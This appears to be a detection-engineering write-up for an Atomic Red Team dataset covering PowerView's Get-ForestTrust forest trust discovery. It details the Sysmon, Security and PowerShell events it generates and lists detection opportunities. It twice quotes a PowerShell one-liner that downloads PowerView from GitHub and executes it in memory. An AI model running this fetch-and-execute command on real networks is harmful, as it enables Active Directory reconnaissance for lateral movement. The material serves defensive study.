# T1482-7: Domain Trust Discovery — Get-ForestTrust with PowerView

## Technique Context

T1482 (Domain Trust Discovery) via PowerView's `Get-ForestTrust` extends the domain trust enumeration in T1482-6 to the forest level. Where `Get-DomainTrust` enumerates trusts for the current domain only, `Get-ForestTrust` maps all trust relationships across the entire Active Directory forest — every domain and their cross-domain trust configurations. For attackers planning lateral movement across forest boundaries or seeking to understand the full scope of their access, forest-level trust topology is more valuable than single-domain trust enumeration.

Like T1482-6, this test loads PowerView via in-memory download and invokes the function directly: `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose`. In the defended variant, Defender killed the process with `0xC0000022`; in this undefended dataset, the technique runs without interference.

## What This Dataset Contains

**Security EID 4688** captures the core evidence. A child `powershell.exe` process is spawned with the full command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose}
```

The only difference from T1482-6 is `Get-ForestTrust` in place of `Get-DomainTrust`. The PowerShell process exits with `0x0` (success), confirming PowerView ran to completion without Defender intervention.

**Sysmon EID 1** captures the child `powershell.exe` and `whoami.exe` process creations. The parent-child relationship between the test framework PowerShell and the technique PowerShell is preserved with full hashes.

**Sysmon EID 7** (ImageLoad) produces 17 image load events — the same count as T1482-6 — documenting the full .NET and PowerShell assembly stack loaded during PowerView execution. This is significantly more than the defended variant (17 vs. ~9 in the defended run), again reflecting the extra assembly loads triggered by PowerView's actual forest enumeration rather than early termination by Defender.

**Sysmon EID 8** (CreateRemoteThread): One event is present, consistent with T1482-6's pattern. This reflects AMSI or PowerShell instrumentation thread creation during the execution.

**Sysmon EID 11** (FileCreate): Three file creation events are present — two from `MsMpEng.exe` writing Defender scan artifacts to `C:\Windows\Temp\`, and one for the PowerShell profile write (`StartupProfileData-NonInteractive` and `StartupProfileData-Interactive`). The Defender scan artifacts are background noise from the always-running Defender service.

**Sysmon EID 17** produces 2 named pipe events for PowerShell host pipes (`\PSHost.*.DefaultAppDomain.powershell`).

**Sysmon EID 10** shows 3 process access events from PowerShell accessing child processes.

The Application channel contains one EID 15 event (background noise). The PowerShell channel (112 events: 106 EID 4104 + 4 EID 4103 + 2 EID 4100) is larger than T1482-6 (101 events), which may reflect `Get-ForestTrust` loading additional code for forest topology traversal compared to single-domain trust enumeration.

**Compared to the defended variant** (20 Sysmon / 12 Security / 29 PowerShell): The undefended run has more Sysmon events (29 vs. 20), more PowerShell events (112 vs. 29), and fewer Security events (4 vs. 12). The higher Sysmon and PowerShell counts confirm deeper execution. The Security count difference reflects Defender-related activity in the defended run. The successful `0x0` exit code is the definitive indicator of completed execution vs. blocked attempt.

Comparing T1482-6 (Get-DomainTrust) and T1482-7 (Get-ForestTrust) in the undefended runs: The forest trust test generates slightly more events (29 Sysmon vs. 27, 112 PowerShell vs. 101), consistent with `Get-ForestTrust` performing broader AD queries. An adversary performing both in sequence would produce a detectable behavioral cluster.

## What This Dataset Does Not Contain

As with T1482-6, Sysmon EID 3 (NetworkConnect) for the `raw.githubusercontent.com` download is not bundled here. The actual `Get-ForestTrust` output (trust names, direction, type) is not captured in any log channel. Domain controller logs are absent — this is workstation telemetry only. The PowerShell EID 4104 samples do not include PowerView function bodies; the script block logging captured test framework boilerplate rather than PowerView's enumeration code.

## Assessment

This dataset provides clean undefended execution evidence for `Get-ForestTrust` via in-memory PowerView. The command line in Security EID 4688 is unambiguous: the PowerSploit GitHub URL, the `Get-ForestTrust -Verbose` invocation, and TLS 1.2 enforcement are all preserved. The successful `0x0` exit code confirms the function ran to completion.

Taken alongside T1482-6, these two datasets document the complete PowerView domain and forest trust enumeration workflow. An adversary performing reconnaissance before lateral movement would typically run both — the sequential behavioral signature across two near-identical PowerShell invocations with different function names is detectable as a discovery campaign rather than an isolated anomaly.

## Detection Opportunities Present in This Data

- **Security EID 4688**: `Get-ForestTrust` in a PowerShell command line is effectively unique to this enumeration purpose. Unlike `Get-DomainTrust`, which might conceivably appear in legitimate admin scripts, `Get-ForestTrust` is rarely used outside of post-exploitation contexts.
- **Security EID 4688**: The full command line with the PowerSploit commit-pinned GitHub URL and `IEX`/`IWR` pattern is a direct IOC. The specific commit hash in the URL (`f94a5d298a1b4c5dfb1f30a246d9c73d13b22888`) is consistent across multiple ART tests and threat actor toolkits.
- **Sysmon EID 1**: Child `powershell.exe` spawned by parent `powershell.exe` with `IEX`/`IWR`/GitHub pattern. Parent-child PowerShell spawning is unusual and worth alerting on.
- **Behavioral sequence**: T1482-6 followed by T1482-7 (or any sequence of `Get-DomainTrust` then `Get-ForestTrust`) within the same session is a reconnaissance campaign signature distinguishable from a single incidental invocation.
- **Sysmon EID 7**: 17 image loads into the technique `powershell.exe` process indicates extensive .NET assembly loading consistent with PowerView's full execution, differentiating completed runs from early Defender kills (which show fewer image loads).
